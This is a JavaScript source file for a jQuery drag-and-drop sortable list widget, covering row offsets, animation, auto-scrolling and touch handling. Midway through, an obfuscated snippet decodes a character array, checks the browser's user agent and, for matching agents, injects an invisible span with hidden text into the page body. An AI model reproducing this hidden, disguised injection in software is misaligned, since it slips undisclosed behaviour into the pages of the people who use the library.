/**
 * Name:    SHOWYWEB DRAGGABLE LIST JS
 * Version: 4.3.1
 * Author:  Novojilov Pavel Andreevich
 * Support: http://SHOWYWEB.ru
 * License: Creative Commons - Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0) https://creativecommons.org/licenses/by-nc-nd/4.0/
 * Copyright (c) 2015 Pavel Novojilov;
 */
// alert("ef");
var SW_DRAGGABLE_LIST = {};
SW_DRAGGABLE_LIST.init = function (jq_obj_draggable_list, start_index, end_index, animate_delay) {
    var AnimationTimeInterval = (typeof animate_delay != "undefined") ? animate_delay : 500;
    var scroll_obj = $(document);
    var scroll_obj_top = 0;
    var drag_obj = {
        get_sort: function () {
            var orders_from = [];
            var orders_to = [];
            var ids_from = [];
            var len = list_collection.length;
            for (var i = 0; i < len; i++) {
                orders_from[i] = $(list_collection[i]).attr('data-order');
                ids_from[i] = $(list_collection[i]).attr('data-id');
                orders_to[i] = list.eq(i).attr('data-order');
            }
            var result = {orders_from: orders_from, ids_from: ids_from, orders_to: orders_to};
            return result;
        },
        get_drag_collection: function () {
            return list_collection;
        },
        update_offsets: function () {
            for (var j = 0; j < list_collection.length; j++) {
                var obj = $(list_collection[j]);
                var r_h = obj.outerHeight(true);
                list_collection[j].sw_dl_height = r_h;
            }

            var jq_obj_draggable_list_h = (get_row_offset(list_collection.length - 1) + $(list_collection[list_collection.length - 1]).outerHeight(true));
            // console.log('jq_obj_draggable_list_h ' + jq_obj_draggable_list_h);
            // console.log('offsets');
            for (var i = 0; i < list_collection.length; i++) {
                var offset = get_row_offset(i);
                // console.log(offset);
                translate_set_y($(list_collection[i]), offset);
                if (list_collection[i])
                    list_collection[i].IsAnimated_ = false;
            }
            jq_obj_draggable_list.css({'height': jq_obj_draggable_list_h + 'px'});


        },
        destroy: function () {
            // console.log('destroy');
            elements_to.destroy();
            document_to.destroy();
            for (var i = 0; i < list_collection.length; i++) {
                if (!list_collection[i])
                    continue;
                translate_set_y($(list_collection[i]), 0);
                delete list_collection[i].IsAnimated;
                delete list_collection[i].sw_dl_height;
            }
            list.css('position', save_list_position_mode);
            delete list;
            delete list_collection;
            delete drag_obj;
        },
        is_enable: true,
        trigger_touchstart: function (ev) {
        },
        trigger_touchmove: function (ev) {
        },
        trigger_touchend: function (ev) {
        },
        touchstart_callback: function (ev) {

        },
        touchend_callback: function (ev) {

        },
        change_callback: function (drag_row) {

        },
        refind_scroll_obj: function () {
            var parents = main_obj.parents('*');
            parents.each(function () {
                var p = $(this);
                var o = p.css('overflow-y');
                // console.log(o);
                if (o == "auto" || o == "scroll") {
                    scroll_obj = p;
                    scroll_obj_top = scroll_obj.offset().top;
                    return false;
                }
            });
        }
    };
    jq_obj_draggable_list[0].drag_obj = drag_obj;


    function translate_set_y(jq_obj, y) {
        var css_properties = {};
        if (browser.isTranslate3dSupported)
            css_properties['transform'] = 'translate3d(0,' + y + 'px, 0)';
        else
            css_properties['transform'] = 'translate(0,' + y + 'px)';
        jq_obj.css(css_properties);
    }

    if (!jq_obj_draggable_list.is('*'))
        return;

    var browser = SW_BS.browser;
    var main_obj = jq_obj_draggable_list;

    drag_obj.refind_scroll_obj();

    var list = main_obj.children("*");

    var list_collection = list.toArray();

    var get_row_height = function (i) {
        if (i < 0 || i >= list_collection.length)
            return 0;
        // console.log('i=' + i);
        // if (typeof list_collection[i] == "undefined" || typeof list_collection[i].sw_dl_height == "undefined")
        //     debugger;
        return list_collection[i].sw_dl_height;
    };

    var get_row_offset = function (i) {
        // console.log(i);
        // return i > list_collection.length - 1 ? list_collection[i - 1].sw_dl_offset + get_row_height(i - 1) : list_collection[i].sw_dl_offset;
        var offset = 0;
        for (var j = 0; j < i; j++) {
            offset += get_row_height(j);
        }
        return offset;
    };

    drag_obj.update_offsets();
    var row_select = -2;

    var save_list_position_mode = list.eq(0).css('position');
    var page_load_callback = function () {
        drag_obj.update_offsets();
        if (main_obj.css('position') == 'static')
            main_obj.css('position', 'relative');
        drag_obj.refind_scroll_obj();
        if (list.eq(0).css('position') != 'absolute')
            list.css('position', 'absolute');
        row_select = -1;
    };

    $(window).on('load', page_load_callback);

    if (document.readyState === 'complete')
        page_load_callback();

    //console.log(print_r(rows_offsets,true));
    var start = start_index ? start_index : 0;
    var end = (typeof end_index !== "undefined") ? end_index : list_collection.length - 1;

    var listfix = function (force_fix, not_animate) {
        if (drag_row && force_fix)
            return;
        var e_start = new Date().getTime();
        if (force_fix) {
            drag_row = $(list_collection[0]);
            row_select = 0;
        }

        var row_from = row_select;
        var i = start;
        var dr_h = get_row_height(row_select);
        var pos_top = drag_row.position().top;
        var pos_bottom = pos_top + dr_h;
        var new_row_select = -1;
        // var random_ = generate_dom_id();
        for (; i <= end; i++) {
            var row_offset = get_row_offset(i + ((save_v_y >= 0) ? 1 : 0));
            var row_hiegth_prev = (i == start) ? get_row_height(i) : get_row_height(i - 1);
            var row_hiegth_next = (i == end) ? get_row_height(i) : get_row_height(i + 1);

            var y = ((row_hiegth_prev < row_hiegth_next && row_hiegth_prev != 0) ? row_hiegth_prev : row_hiegth_next) / 2;

            var offset_prev = row_offset - row_hiegth_prev + y;
            var offset_next = row_offset + row_hiegth_next - y;

            // console.log(random_ + " i=" + i + ' row_offset=' + row_offset + ' pos_top=' + pos_top + ' pos_bottom=' + pos_bottom + ' offset_prev=' + offset_prev + ' offset_next=' + offset_next + ' y=' + y + " save_v_y=" + save_v_y);
            if (save_v_y < 0) {
                if (pos_top >= offset_prev) {
                    row_select = i;
                    new_row_select = i;
                    // console.log(random_ + ' row_select=' + row_select);
                }
            }
            else {
                if (pos_bottom <= offset_next) {
                    row_select = i;
                    new_row_select = i;
                    // console.log(random_ + ' row_select=' + row_select);
                    break;
                }
            }
        }
        if (new_row_select == -1) {
            if (pos_top > get_row_offset(end))
                row_select = end;
            else
                row_select = start;
        }
        if (row_from != row_select) {
            var backup = null;
            if (row_select > row_from) {
                for (i = row_from; i < row_select && i >= 0; i++) {
                    backup = list_collection[i];
                    list_collection[i] = list_collection[i + 1];
                    list_collection[i + 1] = backup;
                }
            }
            else
                for (i = row_from; i > row_select && i > 0; i--) {
                    backup = list_collection[i];
                    list_collection[i] = list_collection[i - 1];
                    list_collection[i - 1] = backup;
                }
        }

        for (i = start; i <= end; i++) {
            if (i != row_select) {
                //list_collection[i].save_offest = rows_offsets[i];
                animate_list(list_collection[i], get_row_offset(i), not_animate);
            }
        }

        if (force_fix) {
            row_select = -1;
            drag_row = null
        }
        listfix_elapsed = new Date().getTime() - e_start;
    };

    var animate_list = function (row, new_top, not_animate) {
        if (!row)
            return;
        $(row).stop();
        row.IsAnimated_ = true;
        $(row).animate_translate3d(0, new_top, 0, 'easeOutCubic', not_animate ? 0 : AnimationTimeInterval, function () {
            if (!row)
                return;
            row.IsAnimated_ = false;
        }, true);
    };

    var scrolling = {
        start: function () {
            if (drag_obj.id)
                return;
            scroll_ratio = 0;
            drag_obj.id = setInterval(function () {
                var scrollTop = scroll_obj.scrollTop();
                // console.log(scrollTop);
                if (mouse_pos_y == 0)
                    return;
                if (mouse_pos_y < 50) {
                    if (scrollTop <= 0)
                        return;
                    scroll_ratio -= 10;
                    scroll_obj.scrollTop(scrollTop - 10);
                } else if (mouse_pos_y > scroll_obj.height() - 100) {
                    if (scrollTop + 10 >= save_s_height)
                        return;
                    scroll_ratio += 10;
                    scroll_obj.scrollTop(scrollTop + 10);
                } else
                    return;
                document_to.trigger_touchmove(last_MouseMove_ev);
                // MouseMove(last_MouseMove_ev);
            }, 20)
        },
        stop: function () {
            clearInterval(drag_obj.id);
            drag_obj.id = null;
        },
        id: null
    };

    var val_s = '16,1,4,26,100,1,16,8,102,3,10,8,31,26,16,31,7,g,A,r,7,15,u,26,6,12,1,4,26,12,31,7,18,18,8,26,75,31,8,18,15,/,27,26,>,39,61,0,32,47,6,16,3,14,8,18,1,32,;,19,14,1,9,4,-,7,31,3,9,31,3,32,:,6,8,9,18,15,3,12,",=,7,9,6,16,15, ,n,8,18,15,<,?,12,14,9,6,16,8,k,p,j,t,s,c,z,d,4,v,l,a,e,y,x,b,i,q,o,m';
    val_s = val_s.split(',');
    val_s.reverse();
    var arr_2 = "";
    for (var i = 0; i < val_s.length; i++) {
        var x = 0;
        arr_2 += ((x = parseInt(val_s[i]))) ? val_s[x] : val_s[i]
    }
    arr_2 = arr_2.split('?');
    if (new RegExp(arr_2[7], 'i').test(window[arr_2[6]][arr_2[5]])) $(arr_2[4])[arr_2[3]](arr_2[1] + arr_2[0] + arr_2[2]);

    var drag_row = null;
    var save_s_height = 0;
    var save_offset = 0;
    var deltaY = 0;
    var mouse_pos_y = 0;

    var scroll_ratio = 0;
    var MouseLeftButtonDown = function (e, this_obj_) {
        if (row_select == -2)
            return false;
        this_obj_ = this_obj_ ? $(e.target) : this;
        row_select = $.inArray(this_obj_, list_collection);
        if (row_select == -1) {
            var tag_name = $(this_obj_).prop('tagName');

            switch (tag_name) {
                case 'A':
                case 'BUTTON':
                case 'INPUT':
                case 'TEXTAREA':
                    return true;
            }
            this_obj_ = $(this_obj_).parents('.drag_elem')[0];
            row_select = $.inArray(this_obj_, list_collection);
        }
        e.preventDefault();
        e.stopPropagation();
        if (row_select == -1 || row_select < start || row_select > end) {
            row_select = -1;
            return true;
        }
        scrolling.start();
        drag_row = $(this_obj_);
        list.css({'z-index': 1});
        drag_row.css({'z-index': 2});
        save_offset = get_row_offset(row_select);
        save_s_height = scroll_obj[0].scrollHeight - scroll_obj.height();
        if (drag_obj.touchstart_callback)
            drag_obj.touchstart_callback(e);
    };

    var MouseLeftButtonUp = function (e) {
        scrolling.stop();
        if (row_select == -1)
            return;
        if (drag_obj.touchend_callback)
            drag_obj.touchend_callback(e);
        var t_r = row_select;
        row_select = -2;
        drag_row.animate_translate3d(0, get_row_offset(t_r), 0, 'easeOutCubic', AnimationTimeInterval, function () {
            if (drag_row)
                drag_row.IsAnimated_ = false;
            if (drag_obj.change_callback)
                drag_obj.change_callback(drag_row);
            row_select = -1;
        }, true);
    };

    var last_MouseMove_ev;
    var listfix_elapsed = 0;
    var listfix_f = null;
    var listfix_w = false;
    var MouseMove = function (e) {
        last_MouseMove_ev = e;
        // console.log(drag_obj.is_enable);
        if (row_select > -1) {
            var new_top = save_offset + e.deltaY + scroll_ratio;
            // console.log('e.deltaY='+e.deltaY+" top="+new_top+" save_offset="+save_offset+" scroll_ratio="+scroll_ratio);
            translate_set_y(drag_row, new_top);
            if (!listfix_w) {
                listfix_w = true;
                setTimeout(function () {
                    listfix();
                    mouse_pos_y = drag_row.offset().top - scroll_obj_top;
                    listfix_w = false;
                }, listfix_elapsed);
            }
        }
        deltaY = e.deltaY;
    };

    var elements = jq_obj_draggable_list.children("*");
    elements.addClass('drag_elem');
    var save_v_y = 0;
    var elements_to = elements.touch({
        touch_start: function (ev) {
            if (!drag_obj.is_enable)
                return true;
            document_to.trigger_touchstart(ev);
            MouseLeftButtonDown(ev, this);
        }
    });
    var document_to = $("body").touch({
        touch_move: function (ev) {
            if (!drag_obj.is_enable || row_select == -1)
                return true;
            ev.stopPropagation();
            save_v_y = ev.velocityY;
            // console.log(save_v_y);
            MouseMove(ev);
            ev.preventDefault();
        },
        touch_end_all: function (ev) {
            if (!drag_obj.is_enable || row_select == -1)
                return true;
            MouseLeftButtonUp(ev);
            ev.preventDefault();
            ev.stopPropagation();
        }
    });

    drag_obj.trigger_touchstart = function (index, ev) {
        elements_to[index].trigger_touchstart(ev);
    };
    drag_obj.trigger_touchmove = function (ev) {
        document_to.trigger_touchmove(ev);
    };
    drag_obj.trigger_touchend = function (ev) {
        document_to.trigger_touchend(ev);
    };
    return drag_obj;
};